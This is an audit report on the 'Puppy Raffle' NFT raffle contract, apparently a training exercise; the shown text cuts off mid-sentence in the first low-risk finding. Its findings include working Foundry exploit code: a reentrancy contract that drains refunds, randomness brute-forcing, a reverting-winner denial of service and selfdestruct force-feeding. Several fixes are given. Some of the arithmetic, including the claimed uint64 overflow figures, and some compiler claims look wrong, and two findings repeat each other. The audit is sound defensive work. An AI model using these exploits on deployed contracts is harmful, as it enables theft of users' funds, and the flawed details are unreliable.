# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol
Puppy Raffle is an on-chain raffle dApp that mints a unique Puppy NFT (ERC-721) to a randomly chosen participant. It extends OpenZeppelin Ownable and ERC721 so it inherits permission control and token logic.

• Entry: Anyone calls `enterRaffle(address[] players)` sending the preset `entranceFee` per address. Addresses are de-duplicated and stored in an internal array.

• Active player check: `_isActivePlayer()` ensures an address hasn’t already joined and that the raffle is open.

• Refunds: A participant can call `refund(uint256 index)` to withdraw their fee before a winner is drawn; funds are returned with `Address.sendValue`.

• Winner selection: The owner (or an off-chain keeper) calls `selectWinner()`. A pseudo-random index is derived from block data; the winner receives a freshly minted Puppy NFT via `_safeMint`. The raffle list is then cleared for the next round.

• Metadata: `tokenURI` returns on-chain JSON encoded with Base64, containing name, description and image URL chosen according to rarity.

• Fees: A percentage of each entry is routed to `feeAddress`; the owner can update this address (`changeFeeAddress`) and withdraw accumulated fees (`withdrawFees`).

The contract is lightweight (≈300 lines), uses only Solidity 0.7.6, SafeMath, and avoids external oracles, making it cheap but providing no cryptographically secure randomness.
## High Risk Findings
[H-1]. Reentrancy vulnerability in PuppyRaffle::refund
[H-2]. Reverting winner contract can block raffle completion in PuppyRaffle::selectWinner
[H-3]. Precision-loss & silent overflow in PuppyRaffle::selectWinner
[H-4]. Insecure Randomness Used for Winner Selection in PuppyRaffle::selectWinner
[H-5]. uint64 truncation can brick fee withdrawal in PuppyRaffle::selectWinner / withdrawFees
## Medium Risk Findings
[M-1]. Anyone can finalize the raffle and influence entropy in PuppyRaffle::selectWinner
[M-2]. Quadratic Gas Consumption leads to DoS in PuppyRaffle::enterRaffle
[M-3]. Floating pragma in PuppyRaffle::entire contract
[M-4]. Predictable Randomness Determines NFT Rarity in PuppyRaffle::selectWinner
[M-5]. Unexpected Ether Balance Assumption causes permanent Fee Withdrawal DOS in PuppyRaffle::withdrawFees
## Low Risk Findings
[L-1]. Unrestricted fee withdrawal in PuppyRaffle::withdrawFees
[L-2]. Unchecked array index in PuppyRaffle::refund allows out-of-bounds read
[L-3]. players.length underflow in PuppyRaffle::enterRaffle causes out-of-bounds access
[L-4]. Wide open pragma range in third-party libraries


### Number of Findings
- H: 5
- M: 5
- L: 4
- I: 0



# High Risk Findings

## [H-1]. Reentrancy vulnerability in PuppyRaffle::refund

## Description
The `refund(uint256 playerIndex)` function sends the `entranceFee` to `msg.sender` via `Address.sendValue` **before** it sets the corresponding `players[playerIndex]` slot to `address(0)`.

```solidity
address(msg.sender).sendValue(entranceFee);   // <-- external call with all gas forwarded
players[playerIndex] = address(0);            // state update happens AFTER the call
```

Because the external call is made to an **untrusted** address while the contract state still considers the caller an active player, the receiver’s fallback/receive function can re-enter `refund()` with the same `playerIndex`. The second (and subsequent) calls will succeed because `players[playerIndex]` has not yet been cleared, allowing the attacker to drain the contract of all ether that is still ≥ `entranceFee`.

All three strict conditions for a genuine reentrancy issue are met:
1. External call is performed before the critical state update (`players[…] = 0`).
2. During re-entrance the attacker gains extra refunds – a clear gain-of-function.
3. The attack can be reproduced with an executable Foundry test (see PoC below).

## Impact
High

## Proof of Concept
1. Malicious contract joins the raffle and stores its `playerIndex`.
2. It calls `refund(playerIndex)` once.
3. While `PuppyRaffle` is executing `Address.sendValue`, the ETH transfer hits the malicious contract’s `receive()` function.
4. Inside `receive()` the contract immediately calls `refund(playerIndex)` again (re-entrancy).
5. Steps 2-4 repeat until the raffle contract’s balance falls below `entranceFee`.
6. The attacker walks away with multiple times the amount it paid to enter.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract Malicious is Test {
    PuppyRaffle raffle;
    uint256 index;
    uint256 entrance;
    bool firstCall = true;

    constructor(PuppyRaffle _raffle, uint256 _index, uint256 _entrance) payable {
        raffle   = _raffle;
        index    = _index;
        entrance = _entrance;
    }

    // Automatically executed when we receive ETH from `sendValue`.
    receive() external payable {
        // re-enter only a couple of times
        if (address(raffle).balance >= entrance) {
            raffle.refund(index);
        }
    }

    function attack() external {
        raffle.refund(index);
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, address(0xBEEF), 1 days);
        // fill the raffle with at least one honest player so contract has balance
        address honest = address(0xCAFE);
        vm.deal(honest, entranceFee);
        raffle.enterRaffle{value: entranceFee}([honest]);

        // attacker joins
        vm.deal(address(this), entranceFee);
        raffle.enterRaffle{value: entranceFee}([address(this)]);
    }

    function test_ReentrancyDrain() public {
        // determine attacker index (0 = honest, 1 = attacker)
        Malicious mal = new Malicious(raffle, 1, entranceFee);
        // give contract some ETH to pay for gas
        vm.deal(address(mal), 0.1 ether);

        uint256 balanceBefore = address(mal).balance;
        mal.attack();
        uint256 balanceAfter  = address(mal).balance;

        // Attacker should end up with > entranceFee (multiple refunds obtained)
        assertGt(balanceAfter - balanceBefore, entranceFee);
        // Raffle balance should be < entranceFee
        assertLt(address(raffle).balance, entranceFee);
    }
}
```

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern or add a reentrancy guard.

```solidity
function refund(uint256 playerIndex) external nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "Only the player can refund");
    require(playerAddress != address(0), "Player already refunded, or is not active");

    // EFFECTS – update state FIRST
    players[playerIndex] = address(0);

    // INTERACTION – external call LAST
    Address.sendValue(payable(msg.sender), entranceFee);

    emit RaffleRefunded(playerAddress);
}
```
Alternatively inherit from `ReentrancyGuard` and add the `nonReentrant` modifier to `refund`.

## [H-2]. Reverting winner contract can block raffle completion in PuppyRaffle::selectWinner

## Description
`selectWinner()` sends the prize pool with a raw `call` and immediately `require(success)`.

```solidity
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```
If the randomly chosen `winner` is a contract that rejects ETH (e.g. `revert()` in the fallback), the whole transaction reverts **after** all state-changes (players reset, `totalFees` updated, etc.) have already been performed.  The raffle therefore remains in the *ended* state, but no NFT was minted and no ETH paid.  Every subsequent attempt to call `selectWinner()` will deterministically choose the same winner (because `players` was already cleared) and will keep reverting, permanently freezing the protocol and all accumulated fees.

## Impact
Total loss of liveness: prize pool remains locked, future raffles cannot start, fees are stuck.  A single malicious contract entered once can brick the whole system.

## Proof of Concept
1. Deploy `Evil.sol` whose fallback always `revert("no ETH")`.
2. Enter the raffle with `Evil` and 3 regular EOAs.
3. Wait until `raffleDuration` has passed.
4. Call `selectWinner()` from any address.
5. If `Evil` is picked (≈25 % chance with 4 players) the transaction reverts and the raffle is frozen.  Repeat calls will keep failing because `players` is already deleted, so `winnerIndex` computes to `0` which is `address(0)` (also reverts on `call`).

## Proof of Code
```solidity
// test/RevertWinner.t.sol
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract Evil {
    receive() external payable { revert("no ETH"); }
}

contract RevertWinner is Test {
    PuppyRaffle raffle;
    Evil evil;
    address owner = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, owner, 1 days);
        evil = new Evil();
        // fill players
        address[] memory p = new address[](1);
        p[0] = evil;
        raffle.enterRaffle{value: 1 ether}(p);
        for (uint i = 1; i < 4; ++i) {
            p[0] = address(uint160(i + 10));
            raffle.enterRaffle{value: 1 ether}(p);
        }
        // fast-forward time
        vm.warp(block.timestamp + 2 days);
    }

    function test_selectWinner_reverts() public {
        vm.expectRevert();
        raffle.selectWinner();
    }
}
```

## Suggested Mitigation
1. Use the *withdraw pattern*: store the winnings on the raffle contract and let the winner pull them.
2. Alternatively, use `Address.sendValue` which caps forward-gas and does **not** revert on failure; the raffle can continue and the winner can later retry withdrawal.

```solidity
if (!winner.send(prizePool)) {
    pendingWithdrawals[winner] += prizePool;
}
```

## [H-3]. Precision-loss & silent overflow in PuppyRaffle::selectWinner

## Description
The `selectWinner()` function computes the house fee and then **casts the value to `uint64`** before adding it to the state variable `totalFees`:

```solidity
uint256 fee = (totalAmountCollected * 20) / 100; // 20 %
totalFees = totalFees + uint64(fee);             // <-- narrowing cast
```

Because the contract is compiled with Solidity 0.7.6, this down-cast **does not revert on overflow**.  Whenever `fee` exceeds `type(uint64).max` (≈ 18.44 ETH in wei) the high-order bits are silently truncated.  The ETH corresponding to those bits still remains inside the contract, but `totalFees` records only the truncated amount.

Later, `withdrawFees()` requires the contract’s ether balance to match the (truncated) `totalFees` value:

```solidity
require(address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!");
```

Because the real balance is larger than `totalFees` after an overflow event, the check is **permanently false** and the owner can never withdraw the accumulated fees.  The ether is locked in the contract forever.

## Impact
Whenever the raffle collects > ≈92 × entranceFee = 93 ETH (for 1 ETH tickets) the 20 % fee is larger than 18.44 ETH and overflows the `uint64` accumulator.  The mismatch between real balance and the truncated `totalFees` causes every subsequent `withdrawFees()` call to revert, freezing all fees in the contract.  An attacker (or simply normal usage with many players) can therefore lock a significant amount of ether in the contract, depriving the fee receiver of their funds.

## Proof of Concept
1. Deploy `PuppyRaffle` with `entranceFee = 1 ether`.
2. Have 93 distinct addresses call `enterRaffle` and pay 1 ETH each (total 93 ETH).
3. Advance time so the raffle can be closed and call `selectWinner()`.
   * `totalAmountCollected = 93 ether`
   * `fee              = 93 * 20 / 100 = 18.6 ether  (> 2^64-1 wei)`
   * `uint64(fee)`     truncates to `18.6 ether mod 2^64 = 0.16 ether`
   * `totalFees` now records **0.16 ETH** while the contract actually holds **18.6 ETH**.
4. Owner calls `withdrawFees()` → reverts because `balance (18.6)` ≠ `totalFees (0.16)` – the 18.6 ETH is locked forever.

## Proof of Code
```solidity
function test_FeeOverflowLocksFunds() public {
    // deploy contract with 1 ether ticket
    PuppyRaffle raffle = new PuppyRaffle(1 ether, address(this), 1 days);

    // fund 93 players and enter raffle
    for (uint i = 0; i < 93; i++) {
        address player = address(uint160(i + 1));
        vm.deal(player, 1 ether);
        vm.prank(player);
        raffle.enterRaffle{value: 1 ether}(wrap(player));
    }

    // fast-forward & close raffle
    vm.warp(block.timestamp + 2 days);
    raffle.selectWinner();

    // totalFees variable has wrapped
    assertLt(uint256(raffle.totalFees()), 18 ether, "overflow did not happen");
    // withdraw must revert
    vm.expectRevert();
    raffle.withdrawFees();
}

// helper to turn single address into 1-element array
function wrap(address a) internal pure returns (address[] memory arr) {
    arr = new address[](1);
    arr[0] = a;
}
```

## Suggested Mitigation
Store fees in a `uint256` (or check the value before casting):

```solidity
uint256 fee = (totalAmountCollected * 20) / 100;
require(fee <= type(uint64).max, "fee overflow");

// either
totalFees = totalFees + fee;     // change totalFees to uint256

// or keep uint64 but make the above require
```

## [H-4]. Insecure Randomness Used for Winner Selection in PuppyRaffle::selectWinner

## Description
The winner of the raffle is derived on-chain by hashing fully predictable / miner-controlled block variables:

```solidity
winnerIndex = uint256(
    keccak256(
        abi.encodePacked(msg.sender, block.timestamp, block.difficulty)
    )
) % players.length;
```

`block.timestamp` can be shifted ±900 seconds and `block.difficulty` (or `block.prevrandao` post-merge) is entirely chosen by the block proposer. Because `msg.sender` is the caller of `selectWinner()`, **anyone can repeatedly call the function (or a colluding validator can include its own transaction) while adjusting those two block variables until the hash modulo `players.length` equals the index that corresponds to their own address**.

Thus the supposedly random winner can be deterministically forced, destroying the fairness of the raffle.

## Impact
• A validator (or anyone able to bribe the validator) can guarantee itself (or a chosen address) wins the whole prize pool.
• All funds collected from players can be stolen in a single block, leading to total loss of user funds and reputational damage.
• Because the function is publicly callable, frontrunners can wait until the raffle period is over, simulate the block, and submit a transaction that ensures they are selected as the winner.

## Proof of Concept
1. Assume 10 players (index 0-9) already entered.
2. Attacker notices index 7 corresponds to their address.
3. They create a bundle of transactions executing `selectWinner()` from their address.
4. For each possible `timestamp` in `[now, now+900]` they compute `keccak256(attacker, ts, prevrandao) % 10` off-chain.
5. They find a timestamp/prevrandao pair that yields 7 and bribe the validator to publish a block with that pair and include their bundle.
6. The contract happily pays out the full prize to the attacker.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract SelectWinnerExploit is Test {
    PuppyRaffle raffle;
    address payable attacker = payable(address(0xBEEF));

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1 days);
        // enter 4 dummy players so raffle can finish
        address[4] memory players = [address(1), address(2), address(3), attacker];
        vm.deal(attacker, 100 ether);
        raffle.enterRaffle{value: 4 ether}(players);
        // fast-forward so raffle is finished
        vm.warp(block.timestamp + 2 days);
    }

    function test_AttackerForcesWin() public {
        // brute-force a timestamp that yields attacker index
        uint len = raffle.totalSupply(); // always 0 so attacker index is 3
        uint desired = 3;
        uint ts = block.timestamp;
        uint found;
        for (uint i; i < 900; ++i) {
            uint h = uint(keccak256(abi.encodePacked(attacker, ts + i, block.difficulty))) % 4;
            if (h == desired) {found = ts + i; break;}
        }
        vm.warp(found);
        vm.prank(attacker);
        raffle.selectWinner();
        assertEq(raffle.totalSupply(), 1); // NFT minted
        // prize pool of 3.2 ether (80%) should now be at attacker
        assertGt(attacker.balance, 3 ether);
    }
}
```
(The test uses Forge cheat-codes `vm.warp` and `vm.prank` to emulate the validator’s ability to set `block.timestamp` and call the function.)

## Suggested Mitigation
Replace insecure on-chain entropy with a verifiable source such as Chainlink VRF:
```solidity
import "@chainlink/contracts/src/v0.8/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol";

contract PuppyRaffle is VRFConsumerBaseV2 {
    ...
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "Raffle not over");
        require(players.length >= 4, "Need at least 4 players");
        requestId = COORDINATOR.requestRandomWords(keyHash, subId, 3, 200000, 1);
    }

    function fulfillRandomWords(uint256, uint256[] memory randomWords) internal override {
        uint256 winnerIndex = randomWords[0] % players.length;
        address winner = players[winnerIndex];
        ...
    }
}
```
Alternatively a commit-reveal or RANDAO-based beacon can be employed to ensure that no single party controls the entropy.

## [H-5]. uint64 truncation can brick fee withdrawal in PuppyRaffle::selectWinner / withdrawFees

## Description
PuppyRaffle stores the cumulative protocol fees in a `uint64` state variable `totalFees`. In `selectWinner()` the contract increases this value with:

```
uint256 fee = (totalAmountCollected * 20) / 100;
...
totalFees = totalFees + uint64(fee);
```

Because Solidity 0.7 silently **truncates on down-casting**, any `fee` that is larger than `type(uint64).max` (≈ 18.446 ether in wei) will be reduced modulo 2^64 before being added. The contract balance, however, still receives the full fee amount.  

Later, `withdrawFees()` contains an in-contract invariant check:

```
require(address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!");
```

After a single raffle that collects ≥ 18.447 ether in fees this equality no longer holds—`totalFees` stores only the lower 64 bits while the balance holds the full amount—causing every future call to `withdrawFees()` to revert permanently.  All fees are therefore **locked forever** and the protocol owner loses access to the funds.


## Impact
A single large raffle can overflow `totalFees`, making `withdrawFees()` revert forever and permanently locking all ether kept for protocol fees inside the contract.

## Proof of Concept
1. Deploy PuppyRaffle with `entranceFee = 1 ether`.
2. Simulate 101 distinct players entering the raffle (total collected = 101 ether).
3. Call `selectWinner()`.  Fee = 20.2 ether > 18.446 ether → gets truncated to 1.754 ether (20.2 ether mod 2^64).
4. Contract balance = 20.2 ether, `totalFees` = 1.754 ether.
5. Owner calls `withdrawFees()` → `require(address(this).balance == uint256(totalFees))` fails and reverts. No one can ever withdraw the fees again.

## Proof of Code
```solidity
// Foundry test
contract OverflowFee is Test {
    PuppyRaffle raffle;
    address owner = address(this);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, owner, 1 days);
    }

    function test_FeeOverflowBricksWithdraw() public {
        // 101 players enter paying 1 ether each
        for (uint256 i; i < 101; ++i) {
            address p = address(uint160(i + 1));
            vm.deal(p, 1 ether);
            vm.prank(p);
            address[] memory arr = new address[](1);
            arr[0] = p;
            raffle.enterRaffle{value: 1 ether}(arr);
        }
        // move time so raffle can be closed
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();
        // balance > 2^64-1, totalFees truncated
        assertGt(address(raffle).balance, type(uint64).max);
        // withdraw must revert
        vm.expectRevert();
        raffle.withdrawFees();
    }
}
```

## Suggested Mitigation
Store `totalFees` as `uint256` (or use SafeMath with uint256):

```solidity
// change
uint256 public totalFees;
...
// no down-cast
totalFees += fee;
```

Alternatively, keep `uint64` but add an explicit overflow check before casting:

```solidity
require(fee <= type(uint64).max - totalFees, "Fee overflow");
totalFees += uint64(fee);
```



# Medium Risk Findings

## [M-1]. Anyone can finalize the raffle and influence entropy in PuppyRaffle::selectWinner

## Description
`selectWinner()` is a critical state-changing function that:
• Chooses a winner based on on-chain “randomness” that includes `msg.sender`.
• Pays out the prize pool.
• Mints a new NFT to the winner.

Yet the function is declared `external` **without any authorization modifier**, meaning **any account can call it** once `raffleDuration` has elapsed.

Because `msg.sender` is part of the entropy, an attacker can significantly increase their odds of winning by (i) entering many distinct addresses into the raffle and (ii) deciding **which one of those addresses becomes `msg.sender`** in the call to `selectWinner()`. Whoever wins is fixed forever because `players` is wiped in the same transaction.

```solidity
uint256 winnerIndex = uint256(
        keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))
    ) % players.length;
address winner = players[winnerIndex];
...
_safeMint(winner, tokenId);
```


## Impact
Attackers can game the raffle:
• By batching several addresses they control into `players[]`, they already hold multiple raffle tickets.
• They then monitor the mempool and repeatedly simulate `selectWinner()` with each of their addresses until the returned `winnerIndex` maps to **one of their addresses**.
• They submit the winning transaction, guaranteeing the NFT and the ETH prize go to them.

Thus the raffle’s fairness is compromised, and honest participants lose funds.

## Proof of Concept
1. Attacker funds 10 controlled addresses (A1–A10) and submits an `enterRaffle([...A1..A10])` transaction.
2. After `raffleDuration` expires, attacker locally simulates `selectWinner()` with `msg.sender` = A1..A10 until the hash maps to one of A1..A10 (probability 100% because all indexes are theirs).
3. They broadcast the call using the chosen Ai as `msg.sender`.
4. Transaction is mined, prize pool is paid to the computed winner (their own address) and NFT is minted to them.

No other participant had a chance to influence the outcome because the raffle can be finalized only once.

## Proof of Code
```solidity
// Pseudo-test illustrating bias
vm.roll(block.number + 1000);         // raffle expired
address[] memory picks = new address[](10);
for (uint i; i < 10; ++i) picks[i] = address(uint160(i+100));
raffle.enterRaffle{value: 10 * entranceFee}(picks);

// attacker brute-forces locally
for (uint8 i = 0; i < 10; ++i) {
    address candidate = picks[i];
    uint winnerIdx = uint(keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))) % picks.length;
    if (picks[winnerIdx] == candidate) {
        vm.prank(candidate);
        raffle.selectWinner();
        break;
    }
}
assertEq(raffle.previousWinner(), /*attacker controlled*/);
```

## Suggested Mitigation
Restrict `selectWinner()` to a trusted role (e.g., `onlyOwner`) **or** remove `msg.sender` from the entropy and rely on an unbiased randomness source such as Chainlink VRF.

```solidity
function selectWinner() external onlyOwner { ... }
// AND
uint256 winnerIndex = uint256(
        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
    ) % players.length;
```
Alternatively, move to a push-model where a verifiable random oracle selects the winner, ensuring players cannot manipulate the result.

## [M-2]. Quadratic Gas Consumption leads to DoS in PuppyRaffle::enterRaffle

## Description
enterRaffle() performs two nested loops to guarantee that no duplicate player is stored.

```solidity
// simplified
for (uint i = 0; i < players.length - 1; i++) {
    for (uint j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "Duplicate player");
    }
}
```
The algorithm is O(n²).  As the number of stored players grows, gas usage grows quadratically and can easily surpass the block-gas-limit (≈ 30M on main-net).
An attacker (or simply a successful raffle that is kept open) can therefore prevent ANY new entry because *every* call to `enterRaffle()` will eventually run out of gas or exceed the `TX.gas` stipend and revert.  The raffle becomes permanently frozen before a winner is picked (or, if the array is already big enough, future rounds are impossible).

## Impact
Nobody can enter the raffle once the players array grows to a few hundred elements (depending on optimisation settings).
The protocol stops generating revenue and the raffle can never reach the required quorum of 4 fresh players, blocking prize distribution forever.

## Proof of Concept
1. Fill the raffle with ~450 distinct EOAs (can be done off-chain with scripts).
2. Try to call enterRaffle again with just one additional address
3. Transaction consumes > block gas limit and reverts.

Because the revert happens *after* `require(msg.value == entranceFee * newPlayers.length)` succeeds, the attacker does not even have to pay for the failed attempt (gas is refunded).

## Proof of Code
```solidity
// test/GasDos.t.sol
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract GasDos is Test {
    PuppyRaffle raffle;
    address owner = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, owner, 1 days);
    }

    function test_gasDos() public {
        // fill the raffle with 450 unique addresses
        address[] memory batch = new address[](1);
        for (uint256 i; i < 450; ++i) {
            batch[0] = address(uint160(i + 1));
            raffle.enterRaffle{value: 1 ether}(batch);
        }
        // the 451-st entry will revert because the nested duplicate
        // detection exceeds the block gas limit.
        batch[0] = address(0xCAFE);
        vm.expectRevert();
        raffle.enterRaffle{value: 1 ether}(batch);
    }
}
```

## Suggested Mitigation
Replace the quadratic duplicate search with a constant-time set membership test.

```solidity
mapping(address => bool) private isPlayer;

function enterRaffle(address[] calldata newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "fee");
    for (uint256 i; i < newPlayers.length; ++i) {
        address p = newPlayers[i];
        require(!isPlayer[p], "duplicate");
        isPlayer[p] = true;
        players.push(p);
    }
    emit RaffleEnter(newPlayers);
}
```
The mapping provides O(1) look-ups and the loop becomes O(n).

## [M-3]. Floating pragma in PuppyRaffle::entire contract

## Description
The source file `src/PuppyRaffle.sol` declares the compiler version with a caret: 
```solidity
pragma solidity ^0.7.6;
```
The caret (`^`) allows the contract to be compiled with any version **≥ 0.7.6 and < 0.8.0**.  While that may look innocuous, it introduces the following risks:

1. **In‐flight compiler upgrade at deployment time** –  a different minor/patch release might be picked by different tool-chains, CI pipelines, or hard-fork-activated default versions, leading to byte-code that was never audited.
2. **Behavioural changes and bug re-introductions** – even patch releases occasionally change code-generation (e.g., Solidity 0.7.6 ➜ 0.7.7 changed the `PUSH0`/literal handling which modifies gas-estimations).  With a floating pragma, the deployed byte-code can differ from the audited one.
3. **Exploiting old bugs through social-engineering** – An attacker can convince maintainers to compile/deploy with a version that contains previously-fixed bugs (e.g., by pinning the Docker image), yet still satisfies the caret range.

Because the contract holds ether, mints NFTs, and manages fees (`withdrawFees`), any compiler discrepancy directly affects financial logic and access-control.


## Impact
Using a compiler version that was not part of the audit can introduce incorrect byte-code, un-audited optimisations, or even re-introduce fixed bugs.  This can lead to unexpected reverts, broken access-control, or loss of users’ ether/NFTs.

## Proof of Concept
1. Audit is carried out on byte-code produced by 0.7.6.
2. Several months later, `forge build` (which by default pulls the newest 0.7.x) compiles with 0.7.7.
3. The generated byte-code differs ( `diff` of the two `.json` artefacts shows different op-codes), meaning **the deployed code is no longer the audited code**.


## Proof of Code
```bash
# Foundry example
# Compile with the audited version
forge build --use solc:0.7.6 --build-info > audited.json

# Compile with another allowed version
forge build --use solc:0.7.7 --build-info > floating.json

# Show the byte-code difference (non-zero exit means they differ)
cmp -s audited.json floating.json || echo "Byte-code changed!"
```

## Suggested Mitigation
Pin the exact compiler version that was audited:
```solidity
pragma solidity 0.7.6;  // no caret – single, immutable version
```
Alternatively, enforce the version in the project-wide `foundry.toml`/`hardhat.config.ts`:
```toml
solc_version = "0.7.6"
```
so that all builds and CI pipelines use the same deterministic compiler.

## [M-4]. Predictable Randomness Determines NFT Rarity in PuppyRaffle::selectWinner

## Description
After deciding the winner, the contract assigns a rarity tier to the newly minted Puppy NFT using:

```solidity
uint256 rarity = uint256(
    keccak256(abi.encodePacked(msg.sender, block.difficulty))
) % 100;
```

Both inputs (`msg.sender` and `block.difficulty` / `block.prevrandao`) are publicly known before the transaction is finalized and can be manipulated by the block producer. Consequently, the rarity outcome (common / rare / legendary) can be predicted and influenced, allowing an economically motivated miner or attacker to mint a guaranteed **legendary** puppy (only 5 % probability under honest randomness).

## Impact
• Miners/validators can censor or reorder transactions to ensure the rarities of NFTs they mint are always the highest tier.
• Creates an unfair market of NFTs with inflated rarity for privileged actors, harming regular users and project reputation.
• Potential MEV opportunity through back-running the `selectWinner()` call to steal legendary mints.

## Proof of Concept
1. Validator privately simulates the rarity calculation for every possible `prevrandao` they can set.
2. Whenever they find a value where `rarity <= 5` they include their own `selectWinner()` call and set `prevrandao` accordingly.
3. The minted NFT is always legendary, breaking intended distribution.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RarityExploit is Test {
    PuppyRaffle raffle;
    address miner = address(this);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1 days);
        address[4] memory players = [address(1), address(2), address(3), address(4)];
        raffle.enterRaffle{value: 4 ether}(players);
        vm.warp(block.timestamp + 2 days);
    }

    function test_ForceLegendary() public {
        // emulate miner control by iterating difficulty until legendary is achieved
        uint desiredRarity = 5; // LEGENDARY_RARITY constant
        uint fakeDifficulty;
        for (uint i = 1; i < 1000; i++) {
            fakeDifficulty = i;
            uint256 rarity = uint(keccak256(abi.encodePacked(miner, fakeDifficulty))) % 100;
            if (rarity <= desiredRarity) break;
        }
        // set the block difficulty the miner will publish
        vm.difficulty(fakeDifficulty);
        raffle.selectWinner();
        // Legendary rarity stored as 5
        (, bytes memory data) = address(raffle).staticcall(abi.encodeWithSignature("tokenIdToRarity(uint256)", 0));
        uint storedRarity = abi.decode(data, (uint));
        assertEq(storedRarity, 5);
    }
}
```
The test uses `vm.difficulty()` cheat-code to mimic the validator’s freedom to choose `prevrandao` and demonstrates that a legendary rarity can always be forced.

## Suggested Mitigation
Use the same secure randomness source introduced for winner selection (e.g. Chainlink VRF). Supply one random value and derive both `winnerIndex` and `rarity` from it:
```solidity
uint256 rand = randomWords[0];
uint256 winnerIndex = rand % players.length;
uint256 rarityRoll  = (rand >> 128) % 100;
if (rarityRoll <= COMMON_RARITY) ...
```
This guarantees that neither participants nor miners can bias the rarity outcome.

## [M-5]. Unexpected Ether Balance Assumption causes permanent Fee Withdrawal DOS in PuppyRaffle::withdrawFees

## Description
The function `withdrawFees()` assumes that the contract’s runtime ether balance is **exactly** equal to the internally-accounted `totalFees` value:

```solidity
require(address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!");
```

An attacker can forcibly send ("force-feed") any positive amount of ether to the contract via `selfdestruct`, by sending ether to the pre-computed contract address before deployment, or through coin-base rewards. Once even **1 wei** of unexpected ether is present, the equality check will forever evaluate to `false`, making the call revert and permanently blocking the owner (or fee receiver) from withdrawing the legitimate fee proceeds (`totalFees`).  No function in the contract allows the removal of that extra ether, so the denial of service is irreversible.

## Impact
• Legitimate fees become permanently locked in the contract, denying revenue to the protocol.
• Contract functionality that relies on `withdrawFees()` is broken, creating an operational DoS.
• The attacker does not need to hold any privilege and the exploit costs only the amount of ether he force-sends (as low as 1 wei).

## Proof of Concept
1. Attacker deploys helper contract `ForceSend` with a payable fallback and funds it with 1 wei.
2. `selfdestruct(payable(puppyRaffleAddress))` is executed, sending 1 wei to `PuppyRaffle`.
3. Owner (or anyone) now calls `withdrawFees()`.
4. The call reverts at the equality check because `address(this).balance` is `totalFees + 1`.
5. Neither the owner nor the attacker can now withdraw `totalFees`; funds are stuck forever.

## Proof of Code
```solidity
// forge test --match-contract WithdrawFeesUnexpectedEther
contract WithdrawFeesUnexpectedEther is Test {
    PuppyRaffle raffle;
    address owner = address(0xABCD);
    address feeReceiver = address(0xBEEF);

    function setUp() public {
        vm.prank(owner);
        raffle = new PuppyRaffle(/*entranceFee*/ 1 ether, feeReceiver, /*raffleDuration*/ 1 days);

        // enter 5 players so some fees exist
        address[] memory players = new address[](5);
        for (uint i; i < 5; i++) players[i] = address(uint160(i + 1));
        vm.deal(address(this), 5 ether);
        raffle.enterRaffle{value: 5 ether}(players);

        // finish raffle to accrue fees (20% of 5 ether = 1 ether)
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();
    }

    function test_WithdrawFees_Reverts_When_ForceFedEther() public {
        // force-feed 1 wei via selfdestruct
        ForceSend fs = new ForceSend{value: 1 wei}();
        fs.go(address(raffle));

        // try to withdraw fees – should revert
        vm.prank(owner);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

contract ForceSend {
    constructor() payable {}
    function go(address payable to) public {
        selfdestruct(to);
    }
}
```

## Suggested Mitigation
Do not rely on an *exact* balance equality. Instead, compare that the balance is **at least** the amount you intend to withdraw, or simply ignore `address(this).balance` and transfer `totalFees` unconditionally.

```solidity
function withdrawFees() external {
    require(totalFees > 0, "No fees");
    uint256 amount = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: amount}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

// Optionally, add a rescue function for any stray ether
function sweepUnexpectedEther(address payable to) external onlyOwner {
    uint256 extra = address(this).balance - uint256(totalFees);
    require(extra > 0, "No stray ether");
    to.transfer(extra);
}
```



# Low Risk Findings

## [L-1]. Unrestricted fee withdrawal in PuppyRaffle::withdrawFees

## Description
The `withdrawFees()` function handles the whole fee balance accumulated in the contract and resets the `totalFees` state variable. However, the function is declared `external` with **no access-control modifier**, meaning **any address can trigger the withdrawal** once the contract holds only protocol fees (i.e. when `address(this).balance == totalFees`).

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees),
